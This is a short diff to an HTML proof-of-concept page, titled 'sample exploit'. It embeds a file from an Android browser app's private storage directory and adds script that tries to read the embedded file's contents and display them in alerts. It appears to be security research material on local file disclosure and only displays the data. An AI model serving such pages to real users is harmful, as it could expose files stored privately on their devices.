@@ -2,8 +2,14 @@
   <h1>Hello this is a sample exploit ! </h1>
   <body>
      <object id="ObjAlertePageLogin" width="300" height="100" type="text/plain" data="file:///storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" border="0" style="overflow: hidden;"> 
-    <embed src="file:///storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" type="text/plain" />
+    <embed id='test' src="file:///storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" type="text/plain" />
     </object>
+    <script type='text/javascript'>
+      let a = document.getElementById('test').contentDocument;
+      let b = document.getElementById('test').getTXTDocument();
+      alert('A :'+a)
+      alert('B :'+b)
+      </script>
    </body>
 </html>
 
